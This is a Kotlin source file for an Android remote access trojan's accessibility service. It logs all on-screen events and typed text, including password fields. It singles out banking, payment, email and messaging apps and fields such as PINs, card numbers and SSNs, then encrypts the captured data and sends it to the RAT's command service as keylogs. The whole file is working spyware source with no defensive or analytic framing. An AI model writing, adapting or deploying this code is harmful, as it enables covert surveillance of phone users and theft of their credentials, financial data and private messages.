package com.rat.client.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.rat.client.crypto.EncryptionUtils
import com.rat.client.service.RatService
import com.rat.client.util.DeviceUtils
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class AccessibilityLoggerService : AccessibilityService() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "AccessibilityLogger"
        private const val MAX_EVENTS_BUFFER = 500
        private var eventsBuffer = mutableListOf<Map<String, Any>>()
        private var isLoggingEnabled = true
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Accessibility Logger Service created")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!isLoggingEnabled) return

        try {
            val eventData = mutableMapOf<String, Any>(
                "event_type" to eventTypeToString(event.eventType),
                "package_name" to event.packageName?.toString() ?: "",
                "class_name" to event.className?.toString() ?: "",
                "timestamp" to System.currentTimeMillis(),
                "text" to event.text.joinToString(" | ") { it.toString() },
                "content_description" to event.contentDescription?.toString() ?: "",
                "window_id" to event.windowId,
                "source" to getSourceInfo(event.source)
            )

            // Add to buffer
            synchronized(eventsBuffer) {
                eventsBuffer.add(eventData)
                if (eventsBuffer.size > MAX_EVENTS_BUFFER) {
                    eventsBuffer.removeAt(0)
                }
            }

            // Send sensitive events immediately
            if (isSensitiveEvent(event)) {
                sendEventImmediately(eventData)
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility service connected")
        isLoggingEnabled = true
    }

    private fun eventTypeToString(type: Int): String {
        return when (type) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "WINDOW_STATE_CHANGED"
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> "WINDOW_CONTENT_CHANGED"
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "VIEW_CLICKED"
            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> "VIEW_LONG_CLICKED"
            AccessibilityEvent.TYPE_VIEW_SELECTED -> "VIEW_SELECTED"
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> "VIEW_FOCUSED"
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "VIEW_TEXT_CHANGED"
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> "VIEW_SCROLLED"
            AccessibilityEvent.TYPE_VIEW_HOVER_ENTER -> "VIEW_HOVER_ENTER"
            AccessibilityEvent.TYPE_VIEW_HOVER_EXIT -> "VIEW_HOVER_EXIT"
            AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED -> "VIEW_ACCESSIBILITY_FOCUSED"
            AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED -> "VIEW_ACCESSIBILITY_FOCUS_CLEARED"
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> "VIEW_TEXT_SELECTION_CHANGED"
            AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY -> "VIEW_TEXT_TRAVERSED"
            AccessibilityEvent.TYPE_WINDOWS_CHANGED -> "WINDOWS_CHANGED"
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> "NOTIFICATION_STATE_CHANGED"
            AccessibilityEvent.TYPE_TOUCH_INTERACTION_START -> "TOUCH_INTERACTION_START"
            AccessibilityEvent.TYPE_TOUCH_INTERACTION_END -> "TOUCH_INTERACTION_END"
            AccessibilityEvent.TYPE_GESTURE_DETECTION_START -> "GESTURE_DETECTION_START"
            AccessibilityEvent.TYPE_GESTURE_DETECTION_END -> "GESTURE_DETECTION_END"
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> "WINDOW_CONTENT_CHANGED"
            else -> "UNKNOWN_$type"
        }
    }

    private fun getSourceInfo(source: AccessibilityNodeInfo?): Map<String, Any>? {
        return source?.let { node ->
            mapOf(
                "class_name" to node.className.toString(),
                "text" to node.text?.toString() ?: "",
                "content_description" to node.contentDescription?.toString() ?: "",
                "package_name" to node.packageName?.toString() ?: "",
                "clickable" to node.isClickable,
                "focusable" to node.isFocusable,
                "enabled" to node.isEnabled,
                "password" to node.isPassword,
                "checked" to node.isChecked,
                "selected" to node.isSelected,
                "scrollable" to node.isScrollable,
                "bounds" to node.boundsInScreen?.toString() ?: ""
            )
        }
    }

    private fun isSensitiveEvent(event: AccessibilityEvent): Boolean {
        val sensitiveTypes = setOf(
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
        )

        val sensitivePackages = setOf(
            "com.android.chrome",
            "com.google.android.gm",
            "com.whatsapp",
            "com.facebook.katana",
            "com.instagram.android",
            "com.twitter.android",
            "com.snapchat.android",
            "com.telegram",
            "com.signal",
            "com.bank",
            "com.paypal",
            "com.venmo"
        )

        return sensitiveTypes.contains(event.eventType) ||
                sensitivePackages.any { event.packageName?.toString()?.contains(it) == true }
    }

    private fun sendEventImmediately(eventData: Map<String, Any>) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val service = RatService.getInstance()
                val encrypted = EncryptionUtils.encrypt(Gson().toJson(eventData))
                service?.sendCommand("accessibility_event", encrypted)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send accessibility event: ${e.message}")
            }
        }
    }

    // Public API for command executor
    
    fun getBufferedEvents(): List<Map<String, Any>> {
        return synchronized(eventsBuffer) {
            val copy = eventsBuffer.toList()
            eventsBuffer.clear()
            copy
        }
    }

    
    fun setLoggingEnabled(enabled: Boolean) {
        isLoggingEnabled = enabled
    }

    
    fun isLoggingEnabled(): Boolean = isLoggingEnabled

    // Keylogging via text changes
    
    fun onTextChanged(packageName: String, className: String, text: String, isPassword: Boolean) {
        if (!isLoggingEnabled) return

        val keyData = mapOf(
            "type" to "keystroke",
            "package" to packageName,
            "class" to className,
            "text" to text,
            "is_password" to isPassword,
            "timestamp" to System.currentTimeMillis()
        )

        DeviceUtils.addKeylog(Gson().toJson(keyData))

        if (isPassword || isSensitiveField(className, text)) {
            sendKeyLogImmediately(keyData)
        }
    }

    private fun isSensitiveField(className: String, text: String): Boolean {
        val sensitiveClasses = setOf(
            "EditText",
            "TextInputEditText",
            "PasswordEditText",
            "PinEntryEditText"
        )
        val sensitiveHints = setOf(
            "password",
            "pin",
            "passcode",
            "secret",
            "token",
            "key",
            "credit",
            "card",
            "cvv",
            "ssn"
        )

        return sensitiveClasses.any { className.contains(it, ignoreCase = true) } ||
                sensitiveHints.any { text.lowercase().contains(it) }
    }

    private fun sendKeyLogImmediately(keyData: Map<String, Any>) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val service = RatService.getInstance()
                val encrypted = EncryptionUtils.encrypt(Gson().toJson(keyData))
                service?.sendCommand("keylog", encrypted)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send keylog: ${e.message}")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Accessibility Logger Service destroyed")
    }
}